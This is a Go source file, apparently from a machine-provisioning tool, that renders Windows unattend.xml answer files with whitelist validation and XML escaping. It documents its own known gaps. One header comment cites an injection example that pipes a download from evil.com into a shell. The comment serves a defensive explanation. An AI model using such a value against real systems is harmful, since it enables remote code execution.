// 本文件实现 unattend.xml 渲染（对应实现计划 P3-01 任务 3，依据 SPEC
// §1.5、§5.6、§9.5）。
//
// unattend.xml 由 WinPE 内的 startnet.cmd 去取（见 winpe.go 的
// WinPEInstallScript 注释），不烧进 WIM——这样同一份 boot.wim 能服务同一
// 固件下的所有机器，per-machine 差异全部体现在这份按需渲染的应答文件里。
//
// **两层注入防护，缺一不可**（SPEC §5.6、计划任务 3 明确警示）：
//  1. html/template 提供 XML 转义——防的是"值破坏 XML 结构"（比如值里含
//     `</Value><Command>curl evil.com|sh</Command>` 这类企图注入新元素
//     的内容，转义后会变成纯文本，不会被 XML 解析器当作新标签）；
//  2. guard 包的类型白名单校验——防的是"值是一个合法但恶意的主机名"
//     （例如某个 role/hostname 字段的值经过转义后确实是安全的 XML 文本，
//     但它本身对应的 Windows 侧操作可能有害，或字符集里混入不该出现的
//     控制字符）。
//
// 两者防的是不同的东西，转义不能替代校验：转义只保证"不破坏结构"，不保证
// "值本身合法"。kickstart.go 侧的 InlineParams 已经在渲染 shell 变量赋值
// 之前做过 guard 校验，本文件复用同一套校验器（knownParams），在喂给
// html/template 之前先校验一遍。
package render

import (
	"bytes"
	"fmt"
	htmltemplate "html/template"

	"github.com/lober/lober/internal/core/model"
)

// unattendTemplateSource 是 unattend.xml 的骨架模板文本，按 Windows 应答
// 文件的标准 pass 划分覆盖计划任务 3 要求的五个段落：
//
//	windowsPE pass   → 磁盘配置（DiskConfiguration）+ 镜像选择
//	                   （ImageInstall）
//	specialize pass  → 区域与语言（InputLocale 等，此处与 oobeSystem 合并
//	                   放在同一处以减少 pass 数量，MVP 范围内足够）
//	oobeSystem pass  → 账户（UserAccounts，本地管理员密码）+ 首次登录命令
//	                   （FirstLogonCommands）
//
// 磁盘标识用 Facts[LOBER_DISK_PRIMARY]（服务端决策结果，与 kickstart 侧
// baseDirectives 读同一个 fact 键一致），但 Windows 的应答文件磁盘配置用
// 磁盘序号（DiskID，一个整数），不是 Linux 的 by-id 路径字符串——两者的
// 映射关系需要实机确认（计划任务 6 实机核对清单："磁盘标识那条要特别
// 注意...这可能需要在 WinPE 里做一次转换，那是本任务可能发现的一个额外
// 工作量"）。本函数目前假设 Facts[LOBER_DISK_PRIMARY] 已经是可以直接填入
// <DiskID> 的整数字符串，这是一个已知的契约缺口（见文件末尾说明）。
//
// 本地管理员密码取自 FinalizeToken（已有 TTL 24 小时的短时效凭据，不是
// 新引入的密码字段）——"本地管理员密码要么用一次性的、要么装完立即轮换"
// （SPEC §1.5）：用一个本来就会在 firstboot 完成后被清理的短时效值，天然
// 满足这条要求，不需要再发明一条独立的密码轮换机制。
//
// 不含任何域管/加域相关字段（UnattendJoinDomain、Credentials 的 Domain
// 属性等）——SPEC §1.5 明确"unattend.xml 不放域管凭据，用最小权限专用
// 加域账号，或把加域挪到装机后另一通道"，因此模板里根本不存在这个位置，
// 不是"这次没填"。
//
// 已知的 html/template 限制（本文件的一个实现细节，不是契约缺口）：
// html/template 的 HTML 语法状态机不认识 `<?xml ... ?>` 这种 XML 处理
// 指令语法，会把它当成纯文本内容而把开头的 `<` 转义成 `&lt;`，产出一个
// 开头是 `&lt;?xml...` 的坏文档。因此 XML 声明行不放进本模板字符串里，
// 而是在 RenderUnattend 里作为固定的纯字面量前缀单独拼接（它不含任何
// 用户数据，不需要也不能被转义）。
const unattendTemplateSource = `<unattend xmlns="urn:schemas-microsoft-com:unattend">
  <settings pass="windowsPE">
    <component name="Microsoft-Windows-Setup" processorArchitecture="{{.ProcessorArch}}" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
      <DiskConfiguration>
        <Disk wcm:action="add" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State">
          <DiskID>{{.DiskID}}</DiskID>
          <WillWipeDisk>true</WillWipeDisk>
          <CreatePartitions>
            <CreatePartition wcm:action="add">
              <Order>1</Order>
              <Type>Primary</Type>
              <Extend>true</Extend>
            </CreatePartition>
          </CreatePartitions>
        </Disk>
      </DiskConfiguration>
      <ImageInstall>
        <OSImage>
          <InstallFrom>
            <MetaData wcm:action="add" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State">
              <Key>/IMAGE/NAME</Key>
              <Value>Windows Server {{.OSVersion}}</Value>
            </MetaData>
          </InstallFrom>
          <InstallTo>
            <DiskID>{{.DiskID}}</DiskID>
            <PartitionID>1</PartitionID>
          </InstallTo>
        </OSImage>
      </ImageInstall>
      <UserData>
        <AcceptEula>true</AcceptEula>
      </UserData>
    </component>
    <component name="Microsoft-Windows-International-Core-WinPE" processorArchitecture="{{.ProcessorArch}}" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
      <InputLocale>en-US</InputLocale>
      <SystemLocale>en-US</SystemLocale>
      <UILanguage>en-US</UILanguage>
      <UserLocale>en-US</UserLocale>
    </component>
  </settings>
  <settings pass="specialize">
    <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="{{.ProcessorArch}}" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
      <ComputerName>{{.Hostname}}</ComputerName>
    </component>
  </settings>
  <settings pass="oobeSystem">
    <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="{{.ProcessorArch}}" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS">
      <UserAccounts>
        <AdministratorPassword>
          <Value>{{.LocalAdminPassword}}</Value>
          <PlainText>true</PlainText>
        </AdministratorPassword>
      </UserAccounts>
      <OOBE>
        <HideEULAPage>true</HideEULAPage>
        <NetworkLocation>Work</NetworkLocation>
        <SkipUserOOBE>true</SkipUserOOBE>
      </OOBE>
      <FirstLogonCommands>
{{- range $i, $cmd := .FirstLogonCommands}}
        <SynchronousCommand wcm:action="add" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State">
          <Order>{{$cmd.Order}}</Order>
          <CommandLine>{{$cmd.CommandLine}}</CommandLine>
          <Description>{{$cmd.Description}}</Description>
        </SynchronousCommand>
{{- end}}
      </FirstLogonCommands>
    </component>
  </settings>
</unattend>
`

// unattendTemplate 是解析后的 unattend 模板，包级变量复用（模板解析本身
// 是纯函数，parse 一次即可，不需要每次渲染都重新 Parse）。
var unattendTemplate = htmltemplate.Must(htmltemplate.New("unattend").Parse(unattendTemplateSource))

// unattendFirstLogonCommand 是 FirstLogonCommands 段落中一条命令的数据。
type unattendFirstLogonCommand struct {
	Order       int
	CommandLine string
	Description string
}

// unattendData 是喂给 unattendTemplate 的全部字段。字段名与模板中的
// `{{.Xxx}}` 一一对应。
type unattendData struct {
	ProcessorArch      string
	OSVersion          string
	DiskID             string
	Hostname           string
	LocalAdminPassword string
	FirstLogonCommands []unattendFirstLogonCommand
}

// processorArchFromArch 把 model.Arch 映射为 unattend.xml
// processorArchitecture 属性期望的取值（Windows 应答文件的标准写法：
// x86_64 对应 "amd64"，不是 Linux 常见的 "x86_64" 拼写）。
func processorArchFromArch(arch model.Arch) (string, error) {
	switch arch {
	case model.ArchX86_64:
		return "amd64", nil
	case model.ArchARM64:
		return "arm64", nil
	default:
		return "", fmt.Errorf("render: 未知的架构 %q，无法映射为 unattend.xml 的 processorArchitecture", arch)
	}
}

// firstbootEntryCommandLine 渲染首次登录命令段落的内容（对应 winpe.go 的
// windowsInitScript 落地的 SetupComplete.cmd 同类入口）。
//
// 契约说明：本函数与 WindowsFirstbootScaffold 服务同一个目标（"首次启动
// 后跑用户 hook、发信号、清凭据"），但计划任务 5 明确选择了
// SetupComplete.cmd（系统身份、登录前执行）而非本段的 FirstLogonCommands
// （依赖有人登录）作为主执行机制，真正的用户 hook 执行、下载、校验全部
// 发生在 SetupComplete.cmd 里，不在这里重复。
//
// 但本函数仍然按 ctx.Hooks 中 firstboot 阶段的引用各生成一条只读的核对
// 命令（回显 hook digest 到日志，不执行任何下载或运行动作）——理由：
// 一份从不提及"这个任务实际 pin 了哪些 firstboot hook"的应答文件对运维
// 排障不友好，尤其是 Windows 路线本就比 Linux 侧可观测性弱（没有 syslog，
// SPEC §6.5），让 unattend.xml 本身携带这条诊断信息成本很低。这不是重复
// 实现，只是把"任务 pin 了什么"这个事实从服务端决策结果里如实抄一份到
// 应答文件文本上，供人工核对，真正的执行逻辑仍然只有一处
// （SetupComplete.cmd）。
//
// 无 firstboot hook 时返回恰好一条"确认 SetupComplete.cmd 已执行"的核对
// 命令；有 firstboot hook 时每个 hook 各追加一条回显其 digest 的命令。
func firstbootEntryCommandLine(hooks []model.HookRef) []unattendFirstLogonCommand {
	cmds := []unattendFirstLogonCommand{
		{
			Order:       1,
			CommandLine: `cmd /c echo lober-firstboot-check >> %WINDIR%\Temp\lober-oobe-marker.log`,
			Description: "lober: 确认 SetupComplete.cmd 主执行路径已运行（辅助核对，非主逻辑）",
		},
	}

	order := 2
	for _, h := range firstbootHookRefsSorted(hooks) {
		cmds = append(cmds, unattendFirstLogonCommand{
			Order: order,
			CommandLine: fmt.Sprintf(
				`cmd /c echo lober-pinned-hook: %s >> %%WINDIR%%\Temp\lober-oobe-marker.log`, h.HookDigest),
			Description: fmt.Sprintf(
				"lober: 记录本任务 pin 的 firstboot hook digest %s（仅供核对，"+
					"真正执行在 SetupComplete.cmd 里）", h.HookDigest),
		})
		order++
	}
	return cmds
}

// RenderUnattend 渲染 Windows 家族的 unattend.xml 应答文件（计划任务 3）。
//
// 校验顺序（两层防护，见文件头注释）：
//  1. 先用与 kickstart 侧相同的 InlineParams 校验器白名单校验
//     ctx.Task.ResolvedParams（不内联为 shell 变量，只借用它的校验逻辑与
//     错误信息，产出丢弃）——不合法立即整体拒绝，不进入模板渲染；
//  2. 校验通过后，html/template 在渲染时对全部字段做 XML 转义。
func RenderUnattend(ctx model.RenderContext) (string, error) {
	if _, err := InlineParams(ctx.Task.ResolvedParams); err != nil {
		return "", fmt.Errorf("render: unattend.xml 的表单值未通过 guard 校验器: %w"+
			"——XML 转义能防值破坏文档结构，防不了值本身是一个合法但恶意的取值，"+
			"两道校验都要（SPEC §5.6）", err)
	}

	processorArch, err := processorArchFromArch(ctx.Artifact.Arch)
	if err != nil {
		return "", err
	}

	data := unattendData{
		ProcessorArch:      processorArch,
		OSVersion:          ctx.Artifact.OSVersion,
		DiskID:             ctx.Facts[model.FactDiskPrimary],
		Hostname:           ctx.Task.ResolvedParams["hostname"],
		LocalAdminPassword: ctx.FinalizeToken,
		FirstLogonCommands: firstbootEntryCommandLine(ctx.Hooks),
	}

	var buf bytes.Buffer
	buf.WriteString(xmlDeclaration)
	if err := unattendTemplate.Execute(&buf, data); err != nil {
		return "", fmt.Errorf("render: 渲染 unattend.xml 模板失败: %w", err)
	}
	return buf.String(), nil
}

// xmlDeclaration 是固定的 XML 声明行，不经过 html/template（见
// unattendTemplateSource 上方注释：html/template 不认识 `<?xml ?>` 语法，
// 会把开头的 `<` 误转义）。这是一个不含任何用户数据的纯字面量常量，不
// 需要也不能被转义。
const xmlDeclaration = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"

// ---------------------------------------------------------------------------
// 契约缺口
// ---------------------------------------------------------------------------
//
// 1. 磁盘标识的形态转换。model.RenderContext.Facts[LOBER_DISK_PRIMARY]
//    的值是服务端按 §5.6"服务端决策，用 by-id/by-path/WWN"原则产出的
//    Linux 风格字符串（例如
//    "/dev/disk/by-id/wwn-0x5000c500..."）。Windows 的 <DiskID> 元素期望
//    的是一个从 0 开始的磁盘序号（整数），两者不是同一种标识体系，服务端
//    决策结果不能直接字符串拼进 <DiskID>。
//
//    本文件当前的处理：直接把 Facts[LOBER_DISK_PRIMARY] 的原始值填入
//    <DiskID>——这对单磁盘机器碰巧能工作（几乎所有单盘机器磁盘序号确实是
//    0），但不是设计上正确的映射，对多磁盘机器会产出错误的 DiskID。
//
//    计划任务 6 的实机核对清单已经明确点名这条："磁盘标识那条要特别注意
//    ...这可能需要在 WinPE 里做一次转换，那是本任务可能发现的一个额外
//    工作量"。正解方向有两种：a) 服务端决策阶段为 Windows 家族单独产出
//    一个磁盘序号（需要 M1/M7 的磁盘决策逻辑感知目标 OS 家族并切换输出
//    格式，当前契约没有这个开关）；b) 在 WinPE 阶段（WinPEInstallScript
//    应用镜像之前）用 PowerShell 的 Get-Disk 按某种可靠特征（如总容量、
//    总线类型）把 by-id 字符串反查成实际磁盘序号，再动态改写 unattend.xml
//    里的 DiskID（需要 unattend.xml 支持"占位符 + WinPE 阶段二次替换"，
//    与当前"由渲染器一次性完整渲染"的模型冲突，需要新的机制）。两种都
//    超出本任务字面范围（"unattend.xml 渲染"），本文件只交付"给定一个已
//    经是正确格式的磁盘标识字符串，如何渲染"这一半。
//
// 2. FirstLogonCommands 段落与 SetupComplete.cmd 的职责重叠边界。当前
//    FirstLogonCommands 只做一件轻量的核对动作（见
//    firstbootEntryCommandLine 的注释），真正的 firstboot 逻辑
//    （跑用户 hook、发信号、清凭据）全部在 winpe.go 的
//    WindowsFirstbootScaffold/windowsInitScript 里，通过
//    SetupComplete.cmd 执行。这是计划任务 5 的明确选择（系统身份优先于
//    依赖登录的机制），但也意味着"如果 SetupComplete.cmd 因为某种原因
//    没有被 Windows Setup 正确放置或未被识别"，FirstLogonCommands 段落
//    不会自动补上真正的安装逻辑，只会记一条核对日志。这个风险与"确保
//    SetupComplete.cmd 确实落在了正确路径"绑定在一起，是计划任务 6 实机
//    核对清单"首次登录前的脚本以系统身份执行，且信号能发出"这一条要覆盖
//    的验证范围，不是本文件能在单元测试层面消除的风险。
